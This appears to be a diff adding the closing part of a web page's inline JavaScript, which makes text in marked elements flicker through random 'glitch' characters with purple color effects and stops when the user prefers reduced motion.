+  const MODES={brand:{maxActive:2,resolveSpeed:0.04,mutateChance:0.008},
+               title:{maxActive:4,resolveSpeed:0.06,mutateChance:0.015},
+               hero:{maxActive:8,resolveSpeed:0.08,mutateChance:0.025}};
+  const g=()=>GLITCH[Math.floor(Math.random()*GLITCH.length)];
+  const skip=ch=>ch===" "||ch==="."||ch.charCodeAt(0)>127;
+  const units=[];
+  document.querySelectorAll("[data-morph]").forEach(el=>{
+    const cfg=MODES[el.dataset.morph]||MODES.title;
+    const chars=[...el.textContent].map(ch=>{const s=document.createElement("span");
+      s.textContent=ch;s.style.display="inline-block";if(ch===" ")s.style.minWidth="0.28em";
+      return{original:ch,el:s,prog:0,dir:"resolving"};});
+    el.textContent="";chars.forEach(c=>el.appendChild(c.el));units.push({cfg,chars});
+  });
+  if(!units.length||matchMedia("(prefers-reduced-motion:reduce)").matches)return;
+  let last=0;const INT=50;
+  function paint(c){const p=c.prog,e=c.el;
+    if(p>0){e.style.color=`rgba(109,40,217,${0.55+p*0.45})`;
+      e.style.textShadow=p>0.5?`0 0 ${3+p*5}px rgba(109,40,217,${p*0.28})`:"";
+      e.style.transform=`translateY(${(Math.random()-0.5)*p*1.4}px)`;}
+    else{e.style.color="";e.style.textShadow="";e.style.transform="";e.style.transition="color 200ms ease";}}
+  function frame(now){requestAnimationFrame(frame);if(now-last<INT)return;last=now;
+    units.forEach(u=>{let active=u.chars.filter(c=>c.prog>0).length;
+      u.chars.forEach(c=>{if(skip(c.original))return;
+        if(c.dir==="glitching"){c.prog=Math.min(1,c.prog+0.15+Math.random()*0.1);
+          if(c.prog>=1)c.dir="resolving";c.el.textContent=g();}
+        else if(c.prog>0){c.prog=Math.max(0,c.prog-u.cfg.resolveSpeed-Math.random()*0.02);
+          if(c.prog<=0){c.el.textContent=c.original;c.prog=0;}
+          else c.el.textContent=Math.random()<c.prog?g():c.original;}
+        if(c.prog===0&&active<u.cfg.maxActive&&Math.random()<u.cfg.mutateChance){
+          c.dir="glitching";c.prog=0.05;c.el.textContent=g();active++;}
+        paint(c);});});}
+  requestAnimationFrame(frame);
+})();
+</script>
+</body>
+</html>
